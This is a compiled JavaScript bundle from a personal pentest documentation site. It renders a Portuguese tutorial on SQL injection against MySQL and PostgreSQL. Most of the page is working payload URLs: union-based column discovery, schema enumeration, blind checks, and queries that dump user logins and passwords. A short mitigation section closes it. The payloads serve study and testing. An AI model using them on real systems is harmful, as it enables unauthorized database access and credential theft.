"use strict";(self.webpackChunkmy_docs=self.webpackChunkmy_docs||[]).push([[5872],{6261:(e,n,o)=>{o.r(n),o.d(n,{assets:()=>r,contentTitle:()=>l,default:()=>u,frontMatter:()=>d,metadata:()=>i,toc:()=>t});var a=o(4848),s=o(8453);const d={id:"sqli",title:"sqli"},l=void 0,i={id:"pentest/sqli",title:"sqli",description:"O SQL Injection \xe9 uma vulnerabilidade de seguran\xe7a que ocorre quando um",source:"@site/docs/pentest/sqli.mdx",sourceDirName:"pentest",slug:"/pentest/sqli",permalink:"/my-docs/docs/pentest/sqli",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{id:"sqli",title:"sqli"},sidebar:"tutorialSidebar",previous:{title:"paramspider",permalink:"/my-docs/docs/pentest/paramspider"},next:{title:"subfinder",permalink:"/my-docs/docs/pentest/subfinder"}},r={},t=[{value:"Conceito B\xe1sico",id:"conceito-b\xe1sico",level:2},{value:"Exemplos de SQL Injection",id:"exemplos-de-sql-injection",level:2},{value:"SQLi B\xe1sico",id:"sqli-b\xe1sico",level:3},{value:"Limitando o N\xfamero de Sa\xeddas",id:"limitando-o-n\xfamero-de-sa\xeddas",level:3},{value:"Descobrindo o N\xfamero de Colunas",id:"descobrindo-o-n\xfamero-de-colunas",level:3},{value:"Descobrindo o N\xfamero de Colunas usando UNION SELECT",id:"descobrindo-o-n\xfamero-de-colunas-usando-union-select",level:3},{value:"Obtendo Informa\xe7\xf5es do Banco de Dados",id:"obtendo-informa\xe7\xf5es-do-banco-de-dados",level:3},{value:"Efetuando um Dump de Dados",id:"efetuando-um-dump-de-dados",level:3},{value:"Exibindo Mais de uma Informa\xe7\xe3o por Vez",id:"exibindo-mais-de-uma-informa\xe7\xe3o-por-vez",level:3},{value:"SQL Injection (Blind)",id:"sql-injection-blind",level:2},{value:"Exemplos de SQL Injection Blind",id:"exemplos-de-sql-injection-blind",level:3},{value:"SQL Injection no PostgreSQL",id:"sql-injection-no-postgresql",level:2},{value:"Descobrindo o n\xfamero de colunas",id:"descobrindo-o-n\xfamero-de-colunas-1",level:3},{value:"Descobrindo o n\xfamero de colunas atrav\xe9s do UNION SELECT",id:"descobrindo-o-n\xfamero-de-colunas-atrav\xe9s-do-union-select",level:3},{value:"Validando a coluna para obter informa\xe7\xf5es",id:"validando-a-coluna-para-obter-informa\xe7\xf5es",level:3},{value:"Enumerando informa\xe7\xf5es do banco de dados",id:"enumerando-informa\xe7\xf5es-do-banco-de-dados",level:3},{value:"Extraindo dados",id:"extraindo-dados",level:3},{value:"Mitiga\xe7\xe3o de SQL Injection",id:"mitiga\xe7\xe3o-de-sql-injection",level:2}];function c(e){const n={code:"code",h2:"h2",h3:"h3",hr:"hr",li:"li",p:"p",pre:"pre",ul:"ul",...(0,s.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.p,{children:"O SQL Injection \xe9 uma vulnerabilidade de seguran\xe7a que ocorre quando um\naplicativo web n\xe3o valida corretamente as entradas do usu\xe1rio e permite que um\ninvasor insira comandos SQL maliciosos. Com essa brecha, um atacante pode\nmanipular consultas SQL para acessar, alterar ou excluir informa\xe7\xf5es no banco de\ndados, comprometendo a integridade e confidencialidade dos dados armazenados."}),"\n",(0,a.jsx)(n.hr,{}),"\n",(0,a.jsx)(n.h2,{id:"conceito-b\xe1sico",children:"Conceito B\xe1sico"}),"\n",(0,a.jsx)(n.p,{children:"SQL, que significa Structured Query Language, \xe9 uma linguagem utilizada para\ngerenciar bancos de dados, mas n\xe3o \xe9 o banco de dados em si. Os principais\nbancos de dados que utilizam SQL incluem:"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:"Oracle"}),"\n",(0,a.jsx)(n.li,{children:"SQL Server"}),"\n",(0,a.jsx)(n.li,{children:"MySQL"}),"\n",(0,a.jsx)(n.li,{children:"DB2"}),"\n",(0,a.jsx)(n.li,{children:"PostgreSQL"}),"\n"]}),"\n",(0,a.jsx)(n.h2,{id:"exemplos-de-sql-injection",children:"Exemplos de SQL Injection"}),"\n",(0,a.jsx)(n.h3,{id:"sqli-b\xe1sico",children:"SQLi B\xe1sico"}),"\n",(0,a.jsx)(n.p,{children:"Na forma mais b\xe1sica de SQL Injection, o invasor insere dados maliciosos em um\nformul\xe1rio ou atrav\xe9s de par\xe2metros na URL para manipular consultas. Por\nexemplo:"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsxs)(n.li,{children:["\n",(0,a.jsx)(n.p,{children:"Preenchimento no formul\xe1rio:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"teste' or 1=1;#\n"})}),"\n"]}),"\n",(0,a.jsxs)(n.li,{children:["\n",(0,a.jsx)(n.p,{children:"M\xe9todo GET via URL:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"http://intranet.businesscorp.com.br:8080/cat.php?id=3 or 1=1;#\n"})}),"\n"]}),"\n"]}),"\n",(0,a.jsx)(n.h3,{id:"limitando-o-n\xfamero-de-sa\xeddas",children:"Limitando o N\xfamero de Sa\xeddas"}),"\n",(0,a.jsxs)(n.p,{children:["\xc9 poss\xedvel limitar o n\xfamero de sa\xeddas usando a cl\xe1usula ",(0,a.jsx)(n.code,{children:"LIMIT"})," em conjunto com\nSQL Injection. Por exemplo:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"teste' or 1=1 limit 1;#\n"})}),"\n",(0,a.jsx)(n.h3,{id:"descobrindo-o-n\xfamero-de-colunas",children:"Descobrindo o N\xfamero de Colunas"}),"\n",(0,a.jsxs)(n.p,{children:["Para descobrir o n\xfamero de colunas em uma tabela, pode-se fazer tentativas\nincrementais na cl\xe1usula ",(0,a.jsx)(n.code,{children:"ORDER BY"})," at\xe9 que um erro ocorra. Por exemplo:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"http://<host>/cat.php?id=-1 order by 1\nhttp://<host>/cat.php?id=-1 order by 2\nhttp://<host>/cat.php?id=-1 order by 3\nhttp://<host>/cat.php?id=-1 order by 4\nhttp://<host>/cat.php?id=-1 order by 5 (Com erro - tabela possui 4 colunas)\n"})}),"\n",(0,a.jsx)(n.h3,{id:"descobrindo-o-n\xfamero-de-colunas-usando-union-select",children:"Descobrindo o N\xfamero de Colunas usando UNION SELECT"}),"\n",(0,a.jsxs)(n.p,{children:["Outra maneira de descobrir o n\xfamero de colunas \xe9 atrav\xe9s do uso da cl\xe1usula\n",(0,a.jsx)(n.code,{children:"UNION SELECT"}),". Por exemplo:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"http://<host>/cat.php?id=-1 union select 1\nhttp://<host>/cat.php?id=-1 union select 1,2\nhttp://<host>/cat.php?id=-1 union select 1,2,3\nhttp://<host>/cat.php?id=-1 union select 1,2,3,4 (Com erro - tabela possui 4 colunas)\n"})}),"\n",(0,a.jsx)(n.h3,{id:"obtendo-informa\xe7\xf5es-do-banco-de-dados",children:"Obtendo Informa\xe7\xf5es do Banco de Dados"}),"\n",(0,a.jsx)(n.p,{children:"Uma vez que o n\xfamero de colunas \xe9 conhecido, pode-se obter informa\xe7\xf5es do banco\nde dados, como a vers\xe3o do MySQL, o nome do banco de dados, os usu\xe1rios atuais,\nas tabelas existentes e suas colunas. Por exemplo:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:'http://<host>/cat.php?id=-1 union select 1,@@version,3,4\nhttp://<host>/cat.php?id=-1 union select 1,database(),3,4\nhttp://<host>/cat.php?id=-1 union select 1,current_user(),3,4\nhttp://<host>/cat.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata\nhttp://<host>/cat.php?id=-1 union select 1,table_name,3,4 from information_schema.tables;\nhttp://<host>/cat.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema="nome_do_db";\nhttp://<host>/cat.php?id=-1 union select 1,column_name,3,4 from information_schema.columns where table_schema="nome_do_db" and table_name="nome_tabela";\n'})}),"\n",(0,a.jsx)(n.h3,{id:"efetuando-um-dump-de-dados",children:"Efetuando um Dump de Dados"}),"\n",(0,a.jsx)(n.p,{children:"Uma vez que se sabe o nome da tabela e das colunas, pode-se efetuar um dump de\ndados do banco de dados. Por exemplo:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"http://<host>/cat.php?id=-1 union select 1,login,3,4 from users;\nhttp://<host>/cat.php?id=-1 union select 1,password,3,4 from users;\n"})}),"\n",(0,a.jsx)(n.h3,{id:"exibindo-mais-de-uma-informa\xe7\xe3o-por-vez",children:"Exibindo Mais de uma Informa\xe7\xe3o por Vez"}),"\n",(0,a.jsx)(n.p,{children:"Tamb\xe9m \xe9 poss\xedvel combinar informa\xe7\xf5es em uma \xfanica sa\xedda. Por exemplo:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"http://<host>/cat.php?id=-1 union select 1,concat(login,':',password),3,4 from users;\n"})}),"\n",(0,a.jsx)(n.h2,{id:"sql-injection-blind",children:"SQL Injection (Blind)"}),"\n",(0,a.jsx)(n.p,{children:"O SQL Injection Blind ocorre quando a aplica\xe7\xe3o n\xe3o exibe mensagens de erro ou\ninforma\xe7\xf5es \xfateis para o invasor. Ele precisa usar a l\xf3gica booleana para\ninferir se as consultas s\xe3o verdadeiras ou falsas."}),"\n",(0,a.jsx)(n.h3,{id:"exemplos-de-sql-injection-blind",children:"Exemplos de SQL Injection Blind"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsxs)(n.li,{children:["\n",(0,a.jsx)(n.p,{children:"Verificando o n\xfamero de colunas:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"1' and 1=1 order by 1# (Com retorno da aplica\xe7\xe3o)\n1' and 1=1 order by 2# (Com retorno da aplica\xe7\xe3o)\n1' and 1=1 order by 3# (Sem retorno da aplica\xe7\xe3o - duas colunas)\n"})}),"\n"]}),"\n",(0,a.jsxs)(n.li,{children:["\n",(0,a.jsx)(n.p,{children:"Obtendo informa\xe7\xf5es do banco de dados:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"1' and 1=1 union select 'null',null,null,null (Com erro)\n1' and 1=1 union select null,'null',null,null (Sem erro)\n"})}),"\n"]}),"\n"]}),"\n",(0,a.jsx)(n.h2,{id:"sql-injection-no-postgresql",children:"SQL Injection no PostgreSQL"}),"\n",(0,a.jsx)(n.p,{children:"Abaixo est\xe3o algumas t\xe9cnicas comuns de SQL Injection no PostgreSQL."}),"\n",(0,a.jsx)(n.h3,{id:"descobrindo-o-n\xfamero-de-colunas-1",children:"Descobrindo o n\xfamero de colunas"}),"\n",(0,a.jsxs)(n.p,{children:["Para determinar o n\xfamero de colunas em uma tabela, o invasor pode usar a\ncl\xe1usula ",(0,a.jsx)(n.code,{children:"order by"})," e incrementar o valor at\xe9 encontrar o primeiro erro."]}),"\n",(0,a.jsx)(n.p,{children:"Exemplo:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"http://<host>/cat.php?id=-1 order by 1 (Sem erro)\nhttp://<host>/cat.php?id=-1 order by 2 (Sem erro)\nhttp://<host>/cat.php?id=-1 order by 3 (Sem erro)\nhttp://<host>/cat.php?id=-1 order by 4 (Sem erro)\nhttp://<host>/cat.php?id=-1 order by 5 (Com erro)\n"})}),"\n",(0,a.jsx)(n.p,{children:"Neste caso, a tabela possui 4 colunas."}),"\n",(0,a.jsx)(n.h3,{id:"descobrindo-o-n\xfamero-de-colunas-atrav\xe9s-do-union-select",children:"Descobrindo o n\xfamero de colunas atrav\xe9s do UNION SELECT"}),"\n",(0,a.jsx)(n.p,{children:"O invasor pode usar a t\xe9cnica UNION SELECT para determinar o n\xfamero de colunas\nem uma consulta."}),"\n",(0,a.jsx)(n.p,{children:"Exemplo:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"http://<host>/cat.php?id=-1 union select null (Com erro)\nhttp://<host>/cat.php?id=-1 union select null,null (Com erro)\nhttp://<host>/cat.php?id=-1 union select null,null,null (Com erro)\nhttp://<host>/cat.php?id=-1 union select null,null,null,null (Sem erro)\nhttp://<host>/cat.php?id=-1 union select null,null,null,null,null (Com erro)\n"})}),"\n",(0,a.jsx)(n.p,{children:"Nesse caso, a tabela possui 4 colunas."}),"\n",(0,a.jsx)(n.h3,{id:"validando-a-coluna-para-obter-informa\xe7\xf5es",children:"Validando a coluna para obter informa\xe7\xf5es"}),"\n",(0,a.jsx)(n.p,{children:"Ap\xf3s determinar o n\xfamero de colunas, o invasor pode validar qual coluna cont\xe9m\ninforma\xe7\xf5es relevantes para a extra\xe7\xe3o."}),"\n",(0,a.jsx)(n.p,{children:"Exemplo:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"http://<host>/cat.php?id=-1 union select 'null',null,null,null (Com erro)\nhttp://<host>/cat.php?id=-1 union select null,'null',null,null (Sem erro)\nhttp://<host>/cat.php?id=-1 union select null,null,'null',null (Com erro)\nhttp://<host>/cat.php?id=-1 union select null,null,null,'null' (Com erro)\n"})}),"\n",(0,a.jsx)(n.p,{children:"Neste caso, a aplica\xe7\xe3o replica a informa\xe7\xe3o na p\xe1gina atrav\xe9s do campo dois."}),"\n",(0,a.jsx)(n.h3,{id:"enumerando-informa\xe7\xf5es-do-banco-de-dados",children:"Enumerando informa\xe7\xf5es do banco de dados"}),"\n",(0,a.jsx)(n.p,{children:"Uma vez que o invasor determinou as colunas relevantes, ele pode prosseguir para\nobter informa\xe7\xf5es do banco de dados."}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsxs)(n.li,{children:["\n",(0,a.jsx)(n.p,{children:"Verificar todos os bancos de dados:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"http://<host>/cat.php?id=-1 union select null,datname,null,null from pg_database;\n"})}),"\n"]}),"\n",(0,a.jsxs)(n.li,{children:["\n",(0,a.jsx)(n.p,{children:"Verificar todas as tabelas:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"http://<host>/cat.php?id=-1 union select null,tablename,null,null from pg_tables;\nhttp://<host>/cat.php?id=-1 union select null,table_name,null,null from information_schema.tables;\n"})}),"\n"]}),"\n",(0,a.jsxs)(n.li,{children:["\n",(0,a.jsx)(n.p,{children:"Verificar as tabelas em um banco de dados espec\xedfico:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"http://<host>/cat.php?id=-1 union select null,table_name,null,null from information_schema.tables where table_catalog='nome_do_db';\n"})}),"\n"]}),"\n",(0,a.jsxs)(n.li,{children:["\n",(0,a.jsx)(n.p,{children:"Verificar as colunas de uma tabela:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"http://<host>/cat.php?id=-1 union select null,column_name,null,null from information_schema.columns where table_name='nome_da_tabela';\n"})}),"\n"]}),"\n"]}),"\n",(0,a.jsx)(n.h3,{id:"extraindo-dados",children:"Extraindo dados"}),"\n",(0,a.jsx)(n.p,{children:"Uma vez que o invasor conhece o nome da tabela e das colunas, pode efetuar um dump de dados sens\xedveis."}),"\n",(0,a.jsx)(n.p,{children:"Exemplo:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-text",children:"http://<host>/cat.php?id=-1 union select null,login,null,null from users;\nhttp://<host>/cat.php?id=-1 union select null,password,null,null from users;\n"})}),"\n",(0,a.jsx)(n.h2,{id:"mitiga\xe7\xe3o-de-sql-injection",children:"Mitiga\xe7\xe3o de SQL Injection"}),"\n",(0,a.jsx)(n.p,{children:"Para evitar SQL Injection, \xe9 fundamental adotar pr\xe1ticas seguras de programa\xe7\xe3o:"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:"Use consultas parametrizadas (prepared statements) ou ORM (Object-Relational\nMapping) para evitar a inser\xe7\xe3o direta de dados do usu\xe1rio nas consultas SQL."}),"\n",(0,a.jsx)(n.li,{children:"Realize a valida\xe7\xe3o e sanitiza\xe7\xe3o adequada de todas as entradas do usu\xe1rio\nantes de incorpor\xe1-las em consultas SQL."}),"\n",(0,a.jsx)(n.li,{children:"Limite os privil\xe9gios de acesso do usu\xe1rio do banco de dados para minimizar os\ndanos em caso de explora\xe7\xe3o bem-sucedida."}),"\n",(0,a.jsx)(n.li,{children:"Mantenha o software do banco de dados e do aplicativo atualizado com as\n\xfaltimas corre\xe7\xf5es de seguran\xe7a."}),"\n",(0,a.jsx)(n.li,{children:"Monitore os logs do aplicativo e do banco de dados em busca de atividades\nsuspeitas."}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"Ao seguir essas pr\xe1ticas, \xe9 poss\xedvel reduzir significativamente o risco de SQL\nInjection no PostgreSQL."})]})}function u(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(c,{...e})}):c(e)}},8453:(e,n,o)=>{o.d(n,{R:()=>l,x:()=>i});var a=o(6540);const s={},d=a.createContext(s);function l(e){const n=a.useContext(d);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:l(e.components),a.createElement(d.Provider,{value:n},e.children)}}}]);